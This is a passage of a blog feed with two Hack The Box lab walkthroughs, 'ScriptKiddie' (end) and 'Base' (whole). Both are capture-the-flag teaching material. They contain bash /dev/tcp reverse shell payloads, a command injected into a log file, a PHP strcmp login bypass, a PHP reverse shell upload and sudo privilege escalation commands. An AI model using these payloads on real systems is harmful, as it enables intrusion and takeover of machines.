srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-244.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-244.png 640w"></figure><hr><h2 id="02-foothold-with-out-using-msf">02. Foothold | With out using MSF</h2><p>Now we have the gun. Let&apos;s load it and shoot &#x1F52B;</p><p>I neglected to mention what is that vulnerability. Therefore, let me introduce the <strong>CVE-2020-7384</strong> &#x1F387;&#x1F387; Actually that vulnerability works on the Metasploit&apos;s msfvenom payload generator. Here is a small description of the vulnerability from <a href="https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/" rel="noopener noreferrer">Rapid7</a></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-245.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1090" height="229" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-245.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-245.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-245.png 1090w" sizes="(min-width: 720px) 720px"></figure><p>But we are not playing here with metasploit. Let&apos;s do it manually ok?? &#x1F9BD;&#x1F609;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-246.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="480" height="360"></figure><p>Here is the POC code for the vularability. &#x1F447;&#x1F447;</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md"><div class="kg-bookmark-content"><div class="kg-bookmark-title">justinsteven/advisories</div><div class="kg-bookmark-description">Contribute to justinsteven/advisories development by creating an account on GitHub.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" alt="ScriptKiddie Walkthrough"><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">justinsteven</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://opengraph.githubassets.com/8c6db3fce370680f2d6801ff0e9c896e8f6576d1cd8f78dc042d7edd8404b3af/justinsteven/advisories" alt="ScriptKiddie Walkthrough"></div></a></figure><p>First go the POC section and copy that to a file in our host machine.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-248.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1381" height="622" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-248.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-248.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-248.png 1381w" sizes="(min-width: 720px) 720px"></figure><p>After that, read the POC line by line. It is written in <strong>python3</strong> and you are not a kiddie right? &#xA0;Read the code line by line, understand it and come back.</p><p>The code contains the payload section itself. We only have to replace that payload. See how cheap it is?</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-249.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1654" height="554" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-249.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-249.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-249.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-249.png 1654w" sizes="(min-width: 720px) 720px"></figure><p>Now it&apos;s time to load the gun. Simply says, time to create the payload. Since we need a reverse shell I will go and create the bash reverse shell to replace the payload section. Follow the code line below &#x1F447;&#x1F447;</p><pre><code class="language-bash">/bin/bash -c \&quot;/bin/bash -i &gt;&amp; /dev/tcp/&lt;YourIP&gt;/4545 0&gt;&amp;1\&quot;</code></pre><p>Final exploit will look like this.&#x1F447;&#x1F447; Please note to replace <strong>YourIP </strong>as yours.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-250.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1684" height="554" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-250.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-250.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-250.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-250.png 1684w" sizes="(min-width: 720px) 720px"></figure><blockquote>&#x1F4E2;&#x1F4E2; <em>Let me introduce my Reverse shell generator for HTB. Click <a href="https://github.com/h4rithd/RevSh3ll-HTB" rel="noopener noreferrer">here</a> to check how awful it is.</em></blockquote><p>Is everything fine?? Let&apos;s compile the code. I will use python3 because the code was written in python3. &#x1F61C;&#x1F61C;</p><pre><code class="language-bash">python3 exploit.py</code></pre><p>Here we have our loaded weapon. &#x1F52B;&#x1F52B;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-251.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="2000" height="747" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-251.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-251.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-251.png 1600w, https://h4rithd.com/blog/content/images/size/w2400/2021/06/image-251.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>After you run the exploit, usually the payload APK file will be stored in <code>/tmp</code> directory. &#xA0;I copied it to the Download directory because, it will be easy for me to browse and select the file. I don&apos;t know what is your fav directory so go and copy that f*#$ing APK file to whatever directory you want. &#x1F620;&#x1F620;</p><p>Also, don&apos;t forget to power up netcat listener.&#x1F601;&#x1F601;</p><pre><code class="language-bash">nc -lvnp 4545</code></pre><p>Now go to the web browser again and go to the payload section too.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-252.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="597" height="322"></figure><p>After doing all the above things, click generate button. Are you listening trough netcat my mate? Look what we got.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-253.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1730" height="662" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-253.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-253.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-253.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-253.png 1730w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="03-privilege-escalation"><strong>03. Privilege Escalation</strong></h2><p>First of all I search around <code>.ssh</code> directory. And it has only <code>authorized_keys</code> left which means you can create SSH key pair using <code>ssh-keygen</code> , then upload the public key to the <code>authorized_keys</code> file. And then you can use SSH to login as user <code>kid</code> by using your private key. But I&apos;m not going to do it here. &#x1F601;&#x1F601;&#x1F601;</p><p>After doing some enumerations I found a fancy script called <code>scanlosers.sh</code> in <code>/home/pwn</code> directory and it is also owned by the user <code>pwn</code>. By looking at the permission on the file, definitely we can&apos;t write anything to that file too.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-254.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1684" height="772" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-254.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-254.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-254.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-254.png 1684w" sizes="(min-width: 720px) 720px"></figure><p>Let&apos;s open that file.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-255.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1644" height="662" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-255.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-255.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-255.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-255.png 1644w" sizes="(min-width: 720px) 720px"></figure><p>By analyzing the script and debugging the code line by line, (Actually here I copied that <code>scanlosers.sh</code> file to my host machine and also created the <code>hackers</code> file in my local system. Then I tried to take the advantage using <code>hackers</code> file. Because in this scenario we can write things only to <code>hackers</code> file) I found the exact way to get reverse shell as the user <strong><code>pwn</code></strong> . Now go and check the file permission on <code>hackers</code> file. You&apos;ll see that we can write anything to that file.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-256.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1384" height="332" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-256.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-256.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-256.png 1384w" sizes="(min-width: 720px) 720px"></figure><p>So here is my payload.&#x1F447;&#x1F3FF;&#x1F447;&#x1F3FF;</p><pre><code class="language-bash">echo &quot;h4rithd  ;/bin/bash -c &apos;bash -i &gt;&amp; /dev/tcp/&lt;YourIP&gt;/7878 0&gt;&amp;1&apos; #&quot; &gt;&gt; /home/kid/logs/hackers</code></pre><p>Please note that you must give a double space between <code>h4rithd</code> and <code>;</code> mark. Again change <strong>YourIP </strong>as yours. Before going to execute that command, open a new terminal and start the netcat listener again on port <code>7878</code>. &#x1F60E;&#x1F60E;</p><pre><code class="language-bash"> nc -lvnp 7878</code></pre><p>After all, execute above payload and wait for the reverse shell. &#x1F971;&#x1F971;&#x1F971;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-257.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="2000" height="230" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-257.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-257.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-257.png 1600w, https://h4rithd.com/blog/content/images/size/w2400/2021/06/image-257.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>But mate, if you are in a busy environment, I mean, if so many users are using the box at the same time that you are using this, the payload won&apos;t work quickly. So... you&apos;d better go, sip some coffee&#x2615; and try again afterwards</p><p>In a short time, we got reverse shell as user <strong><code>pwn</code> </strong>. &#x1F60E;&#x1F60E;&#x1F60E; And if you are familiar in Privilege Escalation you already know what the next command is. Usually it is <code>sudo -l</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-258.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1940" height="846" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-258.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-258.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-258.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-258.png 1940w" sizes="(min-width: 720px) 720px"></figure><p>If you don&apos;t have enough knowledge on <code>sudo</code> commands, check <a href="https://www.explainshell.com/explain?cmd=sudo+-l" rel="noopener noreferrer">explainshell.com</a> It will explain every shell command in a pretty nice way. Here is for <code>sudo -l</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-259.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="1387" height="484" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-259.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-259.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-259.png 1387w" sizes="(min-width: 720px) 720px"></figure><p>Nevertheless, we can simply say that we can use <code>/opt/metasploit-framework-6.0.9/msfconsole</code> with super user (sudo) permission without asking a password. &#x1F609;&#x1F609; Let&apos;s try, type the following command and hit enter.</p><pre><code class="language-bash">sudo /opt/metasploit-framework-6.0.9/msfconsole
sudo cat /root/root.txt</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-260.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="2000" height="1531" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-260.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-260.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-260.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-260.png 2166w" sizes="(min-width: 720px) 720px"></figure><p>Wollah !!! We got the root flag. &#x1F60E;&#x1F60E;&#x1F451;&#x1F451;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/f5d65a923b43647a6bd917578031627e.gif" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="499" height="207"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-262.png" class="kg-image" alt="ScriptKiddie Walkthrough" loading="lazy" width="832" height="749" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-262.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-262.png 832w" sizes="(min-width: 720px) 720px"></figure><p>Okay... I&#x2019;ll see you on the next retired machine! &#xA0;Stay connected... &#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item><item><title><![CDATA[Base Walkthrough]]></title><description><![CDATA[After the Guard Walkthrough, Here I'm with Base box and this is the last machine on the path of Starting Point. Let's hack and grab the flags.]]></description><link>https://h4rithd.com/blog/starting-point-htb-base-walkthrough/</link><guid isPermaLink="false">60b66b72a8ce8209ffb55eaa</guid><category><![CDATA[Starting Point Walkthrough]]></category><category><![CDATA[Base Walkthrough]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[Harith Dilshan]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Sun, 30 May 2021 17:16:00 GMT</pubDate><media:content url="https://h4rithd.com/blog/content/images/2021/06/BaseBG.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://h4rithd.com/blog/content/images/2021/06/BaseBG.jpg" alt="Base Walkthrough"><p>After the Guard Walkthrough, Here I&apos;m with Base box and this is the last machine on the path of Starting Point. Let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 machines rated as &quot;<strong>very easy</strong>&quot; and should be <strong>rooted in a sequence</strong>. So it means, if you need to go through this box, first of all you must have a complete Guard machine.</p><p>Enough talks, &#x1F971; Let&#x2019;s Get It Started &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><strong><em>Disclaimers: </em></strong><em>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! &#x1F431;&#x200D;&#x1F464;</em></blockquote><!--kg-card-begin: html--><script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div><!--kg-card-end: html--><hr><h2 id="00-start-machine-%E2%80%A6"><strong>00. Start Machine &#x2026;</strong></h2><p>To start the machine, Just click on &quot;<strong>Spawn Machine</strong>&quot;.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-213.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1000" height="453" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-213.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-213.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Then you can see the <strong>IP </strong>address for that machine.<strong>&#x1F920;</strong></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-214.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="418" height="484"></figure><p>Before going to enumeration steps we can simply ping to the IP address and check whether &#xA0;the VPN is connected and the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests when passing through the firewall. But in most cases ping will be a success! &#x1F642;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-215.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1480" height="554" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-215.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-215.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-215.png 1480w" sizes="(min-width: 720px) 720px"></figure><p>As a ping result, it&apos;s <code>TTL=63</code>. There is only one route between machine and us (VPN). So definitely it will be a <code>Linux</code> machine.</p><hr><h2 id="01-enumeration-first-%E2%80%A6"><strong><strong>01. Enumeration First &#x2026;</strong></strong></h2><h3 id="011-fast-ports-scan"><strong><strong>01.1 Fast ports scan</strong></strong></h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.48</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-216.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1000" height="620" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-216.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-216.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>There are only two open ports... &#x1F928;&#x1F928;</p><h3 id="012-run-nmap-scripting-engine"><strong><strong>01.2 Run Nmap Scripting Engine</strong></strong></h3><p>To get the best result, we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 22,80 10.10.10.48</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-217.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1000" height="548" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-217.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-217.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Since we have only two ports I will catch port 80 as my first enumeration path.</p><p>Let&apos;s check what we got on port 80 by navigating to the <code>http://10.10.10.48/</code> form any browser you have.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-218.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1322" height="776" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-218.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-218.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-218.png 1322w" sizes="(min-width: 720px) 720px"></figure><p>Here we have <code>login</code> button. By clicking on that button you will navigate to the <code>http://10.10.10.48/login/login.php</code> page.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-219.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1000" height="587" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-219.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-219.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>After doing some enumerations on the web page I was accidently navigated to the <code>http://10.10.10.48/login/</code> page. Take a look at what I got here!!</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-220.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1034" height="455" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-220.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-220.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-220.png 1034w" sizes="(min-width: 720px) 720px"></figure><p>There is a file called <code>login.php.swp</code> and we can download that file. When we try to view the file using cat command or any text editor, you will get so many garbage characters. To prevent from happening that I use <code>strings</code> command to view only readable strings in that file. Now we can read the file but the content is reversed. Oh!! If we want to understand that file content, we need to reverse it again. &#x1F926;&#x200D;&#x2642;&#xFE0F;&#x1F926;&#x200D;&#x2642;&#xFE0F;</p><pre><code class="language-bash">strings login.php.swp | tac</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-221.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1000" height="470" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-221.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-221.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>After reading the PHP source code; it checks the credentials that the user inputs, against the variables that are already stored in <code>config.php</code> to see if they match. Hold on!! Here <code>strcmp</code> is used in the source code and it&apos;s insecure here. The following links will help you to get a better understanding about the vulnerability. We can simply say there is a juggling vulnerability here. &#x1F474;&#x1F474;</p><ul><li><a href="https://www.geeksforgeeks.org/string-comparison-using-vs-strcmp-in-php/">String comparison using == vs strcmp() in PHP</a></li><li><a href="https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/">PHP String Comparison Vulnerabilities</a></li><li><a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">PHP Magic Tricks: Type Juggling</a></li></ul><hr><h2 id="02-foothold"><strong><strong>02. Foothold</strong></strong></h2><p>Let me tell you simply what is happening. Here strcmp is given an empty array to compare against the stored password, so it will return <strong>null</strong> and in PHP, <strong>==</strong> operator only checks the value of a variable for <strong>equality.</strong> Hence the value of <strong>NULL is equal to 0 </strong>here. It&apos;s clear now, isn&apos;t it? To mitigate that kind of vulnerability; should use <strong>===</strong> instead of <strong>==</strong>. &#x1F915;&#x1F915;</p><p>Let&apos;s power up Burp Suite and try to catch the login request. We got the post request. To take the advantage of this vulnerability, change the request body as follows.&#x1F447;&#x1F447; Then turn off intercept.</p><pre><code class="language-bash">username[]=admin&amp;password[]=h4rithd</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-222.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1000" height="450" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-222.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-222.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Now you will be redirected to the <code>upload.php</code> page. In here we can upload any reverse shell but we don&apos;t know where that file is going to be stored. We missed directory fuzzing while enumeration. Let&apos;s do it quickly. To do that I used dirsearch here, you can use your fav tool.&#x1F608;&#x1F608;</p><pre><code class="language-bash">dirsearch -u http://10.10.10.48/ -w /usr/share/seclists/Discovery/Web-Content/big.txt</code></pre><p>Within the first 5 seconds you will hit the right directory. &#x1F60E;&#x1F60E;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-223.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1000" height="402" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-223.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-223.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Now we know where my file is located after I uploaded. Let&apos;s upload the reverse shell now. You can download relevant reverse shell from <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">here</a> or if you are on <code>kali linux</code> machine, you can use following command to get the reverse shell to your current directory.</p><pre><code class="language-bash"> cp /usr/share/webshells/php/php-reverse-shell.php .
 </code></pre><p>Then open the file and edit the following changes on that file. Remember to change &lt;Your IP&gt; as yours. &#x1F913;&#x1F913; Then save the file.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-224.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1000" height="468" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-224.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-224.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Now we can upload the reverse shell file. Click the browse button, then select the file and finally click the upload button.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-225.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="855" height="500" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-225.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-225.png 855w" sizes="(min-width: 720px) 720px"></figure><p>Now power up netcat listener and navigate to the uploaded file. Mine was <code>http://10.10.10.48/_uploaded/h4rithd.php</code>. I renamed that reverse shell file to <code>h4rithd.php</code>.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-226.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1000" height="355" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-226.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-226.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>You can use <code>python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</code> to beatify the <code>www-data</code> shell. But we are landed on to <code>www-data</code> , which means we don&apos;t have much power here. Let&apos;s enumerate again.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-227.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="483" height="314"></figure><p>Do you remember that we found a file name called <code>config.php</code> in <code>login.php.swp</code> ? Let&apos;s view that file now.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-228.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1268" height="442" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-228.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-228.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-228.png 1268w" sizes="(min-width: 720px) 720px"></figure><p>It has some credentials. Now by reading the <code>etc/passwd</code> file we can identify there is a user called john.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-229.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1358" height="404" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-229.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-229.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-229.png 1358w" sizes="(min-width: 720px) 720px"></figure><p>Let&apos;s try to login SSH as john using <code>thisisagoodpassword</code> password! And you will be able to view the user flag after that. &#x1F917;&#x1F917;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-230.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1358" height="332" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-230.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-230.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-230.png 1358w" sizes="(min-width: 720px) 720px"></figure><p>Now, time to grab the root flag.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-231.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="640" height="314" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-231.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-231.png 640w"></figure><hr><h2 id="03-privilege-escalation"><strong><strong>03. Privilege Escalation</strong></strong></h2><p>Now we have john&apos;s password. Let&apos;s check what command we can run as super user in here.</p><pre><code class="language-bash">sudo -l</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-232.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1000" height="301" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-232.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-232.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>We can run &#xA0;<code>find</code> command as sudo. By looking at the <a href="https://man7.org/linux/man-pages/man1/find.1.html">man page</a> for <code>find</code> command, we can identify the uses of &#xA0;<code>-exec</code> commands. Let&apos;s try to get the advantage using that.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-233.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="863" height="376" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-233.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-233.png 863w" sizes="(min-width: 720px) 720px"></figure><p>So the command will be like this.&#x1F447;&#x1F447;</p><pre><code class="language-bash">sudo /usr/bin/find /bin -exec /bin/bash \;</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-234.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="1358" height="442" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-234.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-234.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-234.png 1358w" sizes="(min-width: 720px) 720px"></figure><p>And..... we got the root flag. &#x1F918;&#x1F918;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-235.png" class="kg-image" alt="Base Walkthrough" loading="lazy" width="831" height="713" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-235.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-235.png 831w" sizes="(min-width: 720px) 720px"></figure><hr><p>So now we have completed the Starting point path. From the beginning to the end of the story; we learned a lot of tools, methods and also we tackled with many kinds of machines and vulnerabilities. &#xA0;Overall this was simple but the journey was not that easy. If someone asked me to choose the best one among those boxes I would choose the <a href="https://h4rithd.com/blog/starting-point-htb-pathfinder-walkthrough/index.html">Pathfinder</a>. &#x1F924;&#x1F924;</p><figure class="kg-card kg-image-card"><img 